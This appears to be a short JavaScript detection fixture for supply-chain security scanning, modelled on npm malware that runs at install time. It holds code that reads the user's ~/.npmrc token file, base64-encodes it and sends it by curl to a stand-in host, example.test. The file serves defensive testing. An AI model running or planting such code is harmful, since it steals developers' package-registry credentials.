// Detection fixture (NOT runnable malware): an install-time credential-exfil
// payload of the shape novel-package malware uses — runs at `npm install` before
// any test, so CVE-based SCA approves the package. Endpoint is a neutralized
// example.test sink; this file exists to be FLAGGED, never executed.
const cp = require('child_process');
const fs = require('fs');
const os = require('os');

const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const blob = Buffer.from(npmrc).toString('base64');
cp.exec('curl -s https://collect.example.test/i -d ' + blob);
